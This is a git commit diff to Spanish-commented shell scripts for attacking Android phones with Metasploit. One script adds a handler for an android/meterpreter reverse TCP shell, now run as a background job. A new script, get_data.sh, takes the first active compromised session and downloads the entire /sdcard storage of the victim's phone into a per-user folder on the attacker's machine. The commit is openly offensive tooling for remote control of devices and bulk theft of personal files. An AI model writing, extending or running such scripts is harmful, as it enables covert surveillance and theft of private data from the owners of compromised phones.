804937f635db4a3e81c88f60cddd9827979bd06c
karlosvas <carlosvassan@gmail.com>
2024-12-27 22:41:59 +0100

    Not supported hostname -I

---
+++ metasploit/android/get_data.sh
@@ -0,0 +1,51 @@
+#!/bin/bash
+
+# Función para mostrar el uso del script
+usage() {
+    echo "Uso: $0 -u <USERNAME>"
+    exit 1
+}
+
+# Inicializar la variable USERNAME
+USERNAME=""
+
+# Procesar argumentos de línea de comandos
+while [[ "$#" -gt 0 ]]; do
+    case $1 in
+        -u) USERNAME="$2"; shift ;;
+        *) usage ;;
+    esac
+    shift
+done
+
+# Verificar si se proporcionó un nombre de usuario
+if [[ -z "$USERNAME" ]]; then
+    echo -e "\e[31mDebe proporcionar un nombre de usuario con la opción -u.\e[0m"
+    usage
+fi
+
+# Directorio de destino en tu máquina
+DEST_DIR="$HOME/data/$USERNAME"
+
+# Crear el directorio de destino si no existe
+mkdir -p "$DEST_DIR"
+
+# Obtener el primer ID de sesión disponible
+SESSION_ID=$(msfconsole -q -x "sessions -l; exit" | awk '/^\s*[0-9]+/ {print $1; exit}')
+
+# Verificar si se encontró una sesión
+if [ -z "$SESSION_ID" ]; then
+    echo -e "\e[31mNo se encontró ninguna sesión activa.\e[0m"
+    exit 1
+fi
+
+# Generar el archivo de recursos de Metasploit
+cat <<EOL > get_data.rc
+sessions -i $SESSION_ID --timeout 7200
+cd /sdcard
+download * $DEST_DIR
+exit
+EOL
+
+# Ejecutar Metasploit con el archivo de recursos
+msfconsole -r get_data.rc
--- metasploit/android/local.sh
+++ metasploit/android/local.sh
@@ -1,7 +1,33 @@
 #!/bin/bash
 
-# Obtener la IP local
-LOCAL_IP=$(hostname -I | awk '{print $1}')
+# Función para mostrar el uso del script
+usage() {
+    echo "Uso: $0 [-ip <IP_ADDRESS>]"
+    exit 1
+}
+
+# Inicializar la variable LOCAL_IP
+LOCAL_IP=""
+
+# Procesar argumentos de línea de comandos
+while [[ "$#" -gt 0 ]]; do
+    case $1 in
+        -ip) LOCAL_IP="$2"; shift ;;
+        *) usage ;;
+    esac
+    shift
+done
+
+# Si no se proporcionó una IP, intentar obtener la IP local
+if [[ -z "$LOCAL_IP" ]]; then
+    LOCAL_IP=$(hostname -I | awk '{print $1}')
+fi
+
+# Verificar si la IP es válida
+if [[ -z "$LOCAL_IP" ]]; then
+    echo -e "\e[31mNo se pudo obtener la IP local y no se proporcionó una IP válida.\e[0m"
+    usage
+fi
 
 # Generar el archivo config.rc con la IP local
 cat <<EOL > config.rc
@@ -9,7 +35,7 @@ use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set LHOST $LOCAL_IP
 set LPORT 4444
-exploit
+exploit -j
 EOL
 
 # Ejecutar Metasploit con el archivo config.rc
